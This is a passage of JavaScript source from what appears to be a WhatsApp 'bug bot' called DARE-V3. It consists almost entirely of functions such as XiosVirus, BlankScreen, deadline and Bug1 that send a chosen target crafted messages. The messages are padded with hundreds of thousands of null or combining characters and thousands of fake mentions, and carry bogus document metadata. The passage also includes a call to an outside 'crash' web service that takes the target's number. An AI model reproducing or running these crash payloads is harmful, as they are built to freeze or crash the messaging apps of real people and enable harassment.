                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "⃟⃟⃟⃟⃟⃟⃟⃟𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟⃟⃟⃟" + "\u0000".repeat(50000),
                body: "⃟⃟⃟⃟⃟⃟𓆩𝐃𝐀𝐑𝐄-𝐕𝟑𓆪˖⃟⃟⃟⃟⃟⃟" + "𑜦࣯".repeat(200),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://t.me/RenXiter",
                mediaUrl: "https://t.me/RemXiter",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://t.me/RenXiter",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbClientCampaignId: "smb_client_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }
  async function XiosVirus(target) {
      Dare.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: `𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟⃟⃟-` + "࣯\u0000".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟⃟⃟-" + "\u0000".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
            quoted: NullNihBos
          },
        },
        {
          messageId: null,
        }
      );
    }

      async function BlankScreen(target, Ptcp = false) {
        let virtex = "𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟😈𝐘𝐨𝐮 𝐈𝐬 𝐄𝐧𝐞𝐦𝐲" + "\u0000".repeat(90000);
			await Dare.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "ZynXzo New",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z",
									},
									hasMediaAttachment: true,
								},
								body: {
									text: virtex,
								},
								nativeFlowMessage: {},
								contextInfo: {
								mentionedJid: ["0@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Bokep 18+",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : { quoted: NullNihBos }
			);
       }
       
async function ComBox(target) {
      {
        await XiosVirus(target);
        await Mym(target, Ptcp = true);
        await FloodsCarousel(target, Ptcp = true);
        await BlankScreen(target, Ptcp = true);
      }
    }

    async function FrezeiOS(target) {
      {
        await XiosVirus(target)
        await FloodsCarousel(target, Ptcp = true)
        await Mym(target, Ptcp = true)
      }
    }
    
    
    
    
async function whatsappoffcbjirrrr(target, Ptcp = true) {
      await Dare.relayMessage(
        target,
        {
          extendedTextMessage: {
            text:
              "⿻𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟😈 S͜͡u͜͡p͜͡e͜͡r͜͡M͜͡a͜͡d͜͡e͜͡I͜͡n͜͡H͜͡e͜͡a͜͡v͜͡e͜͡n͜͜͡͡\n" +
              "ꦾ".repeat(99999),
            contextInfo: {
              mentionedJid: [
                "6283187035090@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 18000,
                  },
                  () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                ),
              ],
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: " X ",
              conversionData:
                "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
              conversionDelaySeconds: 10,
              forwardingScore: 9999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: " X ",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: " X ",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "⿻ M͜͡a͜͡d͜͡e͜͡ I͜͡n͜͡ H͜͡e͜͡a͜͡v͜͡e͜͡n͜͡",
                body: "⿻ S͜͡u͜͡p͜͡p͜͡e͜͡r͜͡P͜͡u͜͡c͜͡c͜͡i͜͜͡͡",
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewType: "VIDEO",
                thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://whatsapp.com/channel/",
                mediaUrl: "https://whatsapp.com/channel/",
                containsAutoReply: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://whatsapp.com/channel/",
              },
              groupSubject: " X ",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: " X ",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: " X ",
                utmCampaign: " X ",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " X ",
                contentType: "UPDATE",
                accessibilityText: " X ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbClientCampaignId: "smb_client_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }

    async function badk(target, ptcp = true) {
      await Dare.relayMessage(target, {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0
                },
                hasMediaAttachment: true
              },
              body: {
                text: "M̨̫̲͓̻͚̤̫͜Λ̮͈̜̠̮͖̦̱̟̅͒ͤ̔͂͐͟D̷̯̠̮͚͕̫̭̓ͤ̾̃̽͐̍Λ͉̻̲͓̜̰̟̇ͯ͞ͅ͏Ŕ̨̛̹̼̙͈͖̯̣̞͓̟̅Λ̸̖͇̠͇̺͇̔ͭ̽͑͠Ŧ̵͚Ŕ͍̻̪̲̠̖͕̜ͩ͊ͮ̀͐́̏ΛS̤̮̳͓̱̄ͮ̾̕͟Ḥ̢̭̺͕̟̤͍̂̒ͤ͗̈́ͭ͑̚ͅ" + "ꦾ".repeat(99999)
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: " avocado "
                }]
              }
            }
          }
        }
      }, {
        participant: {
          jid: target
        }
      }, {
        messageId: null
      });
    }
    
    

async function uilokas(target, ptcp = true) {
    await Dare.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Pucci" + "ꦾ".repeat(999999)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " VoC " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}



async function deadline(target, ptcp = true) {
    await Dare.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟😈̷̪̰ͩ͆ͅȘ̖̙̱̮̌͜͡" + "@1".repeat(295000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " VoC " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}



async function whatsappoffcbjir(target, Ptcp = true) {
    const mentionedJid = [
        "0@s.whatsapp.net", 
        ...Array.from({ length: 5000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
    ];

    const contextInfo = {
        mentionedJid, stanzaId: "1234567890ABCDEF", participant: "0@s.whatsapp.net",
        quotedMessage: { callLogMesssage: { isVideo: true, callOutcome: "1", durationSecs: "0", callType: "REGULAR",
            participants: [{ jid: "0@s.whatsapp.net", callOutcome: "1" }] } },
        remoteJid: target, forwardingScore: 9999999, isForwarded: true,
        externalAdReply: { title: "", body: "", mediaType: "VIDEO", renderLargerThumbnail: true,
            thumbnail: "https://g.top4top.io/p_3243wplx71.jpg", sourceUrl: "https://www.yandex.com/WhatsApp" }
    };

    await Dare.relayMessage(target, { 
        extendedTextMessage: { 
            text: " ͜⃟P̞̝͇͇̗͙̘͈̜̝͔̬̾ͤ͜͢͡͡U̷̜̞̬͈̭̪͎̠͖̥͕̫͓ͤ̄͜͡͠𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟😈̸C͉̣̭͓̟͓̭̼̞͔͇͇̣̝͖̳͔̱̳͖̾͜͡҉̸̧C̳ͭ̀͜͡͡I̹̖͖͔̻̟͖̹̺̙̤̩͜͡ͅ⃟>" + "@0".repeat(99999), 
            contextInfo 
        } 
    }, Ptcp ? { participant: { jid: target } } : {});
}

async function Badboicrash(target) {
			try {
				const newcrash = await fetchJson('https://venomweb.site/i/?sendCrashlphone?numero=' + target + '&total=/1&apikey=xeonkey' );
				console.log(chalk.red("𝐃𝐀𝐑𝐄-𝐕𝟑 Succes Send Bug By ©𝐁.𝐌.𝐁 👑"));
				console.log(chalk.red("InVisible⚡"));
			} catch (error) {
				console.error("Error Fetching Crash:", error);
			}
		}
		//function bug1 and bug2
async function Bug1(target) {
let virtex = "𝗫-⃟⃟⃟⃟⃟⃟⃟𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟⃟⃟☠️ 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩";

await Dare.relayMessage(target, {
groupMentionedMessage: {
message: {
interactiveMessage: {
header: {
locationMessage: {
degreesLatitude: 0,
degreesLongitude: 0
},
hasMediaAttachment: true
},
body: {
text: virtex + "ꦾ".repeat(90000)+"@0".repeat(50000)
},
nativeFlowMessage: {},
contextInfo: {
 mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
 groupMention: [{ groupJid: "0@s.whatsapp.net", groupSubject: "Skyzo" }]
}
}
}
}
}, { participant: { jid: target, quoted: Null } }, { messageId: null });
}

async function Bug2(target) {
try {
var atc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
"productMessage": {
"product": {
"productImage": {
"url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m237/up-oil-image-6a66c589-1ed7-4831-9ff7-a537aeec42e5?ccb=9-4&oh=01_Q5AaIO-QEENiH3ITkuP8eDd60OuxvNiUaeZsPjnEfSNbf_lx&oe=6761488D&_nc_sid=e6ed6c&mms3=true",
"mimetype": "image/jpeg",
"fileSha256": "4euJQxdTEpk2NS0R7QK6MjGhcix+h1Evxcrrmj1u9nM=",
"fileLength": "9900090",
"height": 735,
"width": 735,
"mediaKey": "e/5eEYHPLtzZAXLn9cBR8M3+w0bvdFsBvoSf9EPy75w=",
"fileEncSha256": "/UO6fl07VoTDsXv1W9zqYAS+pBUz6HVokpl4r84LuOg=",
"directPath": "/o1/v/t62.7118-24/f1/m237/up-oil-image-6a66c589-1ed7-4831-9ff7-a537aeec42e5?ccb=9-4&oh=01_Q5AaIO-QEENiH3ITkuP8eDd60OuxvNiUaeZsPjnEfSNbf_lx&oe=6761488D&_nc_sid=e6ed6c",
"mediaKeyTimestamp": "1731847042",
